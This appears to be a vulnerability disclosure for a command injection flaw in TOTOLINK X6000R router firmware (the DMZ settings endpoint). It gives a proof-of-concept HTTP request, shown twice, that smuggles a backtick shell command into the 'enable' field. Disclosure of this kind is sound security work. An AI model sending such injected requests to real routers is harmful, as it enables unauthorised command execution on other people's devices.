# Summary
There is a command execution vulnerability in TOTOLINK X6000R V9.4.0cu.852_B20230719(https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/247/ids/36.html).

Affected component is "/advance/dmz.html".

# Details
Web front-end interface:
![image](https://github.com/user-attachments/assets/a700b13b-1e24-4d80-a2a3-f30238159ff2)

Capture the packet and see the enable parameter, and do a blind test directly:
![image](https://github.com/user-attachments/assets/dd17a671-f613-4e51-9c7e-3af5e7d96f49)

```HTTP
POST /cgi-bin/cstecgi.cgi?token=B5904DB48F93AAA0 HTTP/1.1
Host: ip:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 60
Origin: http://ip:8081
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://ip:8081/advance/dmz.html?token=B5904DB48F93AAA0
Priority: u=1

{"enable":"`ls / >/web/poc_dmz.txt`","topicurl":"setDmzCfg"}
```
![image](https://github.com/user-attachments/assets/09c21842-a8da-4575-903e-5f3b1542b638)

![image](https://github.com/user-attachments/assets/49d82a2b-0b1b-4a01-95d9-8ebea9f4afee)



# PoC
Capture the packet and see the enable parameter, and do a blind test directly:
```HTTP
POST /cgi-bin/cstecgi.cgi?token=B5904DB48F93AAA0 HTTP/1.1
Host: ip:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 60
Origin: http://ip:8081
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://ip:8081/advance/dmz.html?token=B5904DB48F93AAA0
Priority: u=1

{"enable":"`ls / >/web/poc_dmz.txt`","topicurl":"setDmzCfg"}
```
![image](https://github.com/user-attachments/assets/09c21842-a8da-4575-903e-5f3b1542b638)

![image](https://github.com/user-attachments/assets/49d82a2b-0b1b-4a01-95d9-8ebea9f4afee)
